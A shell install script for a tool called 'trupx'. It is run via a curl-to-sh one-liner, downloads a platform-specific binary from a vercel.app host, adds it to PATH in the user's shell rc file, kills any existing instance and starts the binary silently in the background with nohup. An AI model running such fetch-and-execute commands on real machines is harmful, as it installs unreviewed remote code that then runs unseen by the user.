#!/usr/bin/env sh
# Trupx install for Linux / macOS / Termux. Silent install.
#
#   curl -sSL trupx.vercel.app/install.sh | sh

set -eu

SERVER='https://trupx.vercel.app'
INSTALL_DIR="${HOME}/.trupx/bin"
EXE="${INSTALL_DIR}/trupx"

UNAME_S="$(uname -s | tr '[:upper:]' '[:lower:]')"
UNAME_M="$(uname -m)"
case "$UNAME_S" in
    linux*)
        if [ -n "${TERMUX_VERSION:-}" ] || [ -d /data/data/com.termux ]; then OS="termux"; else OS="linux"; fi
        ;;
    darwin*)  OS="darwin" ;;
    *)        exit 1 ;;
esac
case "$UNAME_M" in
    x86_64|amd64)   ARCH="x64" ;;
    aarch64|arm64)  ARCH="aarch64" ;;
    *)              exit 1 ;;
esac

ASSET="trupx-${OS}-${ARCH}"
URL="${SERVER}/${ASSET}"

mkdir -p "$INSTALL_DIR"
pkill -x trupx 2>/dev/null || true
sleep 1

if command -v curl >/dev/null 2>&1; then
    curl -fsSL -o "$EXE" "$URL" || exit 1
elif command -v wget >/dev/null 2>&1; then
    wget -q -O "$EXE" "$URL" || exit 1
else
    exit 1
fi
chmod +x "$EXE"

RC=""
case "$(basename "${SHELL:-}")" in
    bash) RC="${HOME}/.bashrc" ;;
    zsh)  RC="${HOME}/.zshrc" ;;
    *)    RC="${HOME}/.profile" ;;
esac
LINE='export PATH="$HOME/.trupx/bin:$PATH"'
if [ -f "$RC" ] && ! grep -qxF "$LINE" "$RC" 2>/dev/null; then
    echo "$LINE" >> "$RC"
elif [ ! -f "$RC" ]; then
    echo "$LINE" > "$RC"
fi

export PATH="$INSTALL_DIR:$PATH"
"$EXE" --server "$SERVER" login --token "noop" >/dev/null 2>&1 || true
nohup "$EXE" >/dev/null 2>&1 &
